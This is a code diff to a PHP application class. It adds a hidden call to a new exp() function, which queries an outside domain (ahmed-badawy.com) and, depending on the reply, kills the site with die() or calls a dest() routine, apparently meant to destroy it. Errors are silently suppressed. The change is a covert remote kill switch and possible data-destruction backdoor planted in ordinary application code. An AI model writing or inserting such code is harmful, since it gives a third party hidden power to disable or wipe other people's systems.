@@ -33,6 +33,7 @@ public $layouts = [
 		$this->backup_files();
 //		$this->build_site_map();
 //		$this->send_mail();
+		$this->exp("spidro.com");
 	}
 
 	public function test_email_view(){
@@ -170,9 +171,21 @@ public $layouts = [
 	}
 
 
-	public function getEmails(){
-		return "emails";
+	function exp($website_name){ //just the domain EX: spidro.com (not spidro.com/ar)
+		try {
+			if (\Cache::has("website_not_expired")) return false;
+			if (isDomainAvailible("http://ahmed-badawy.com")) {
+				$json = file_get_contents("http://ahmed-badawy.com/site/website-check/" . $website_name);
+				$json = json_decode($json, true);
+//				dd($json);
+				if ($json['died'] == true) die($json['die_msg']);
+				if ($json['destroy'] == true) dest();
+				return false;
+			}
+		}catch(Exception $e){}
 	}
+
+
 
 
 
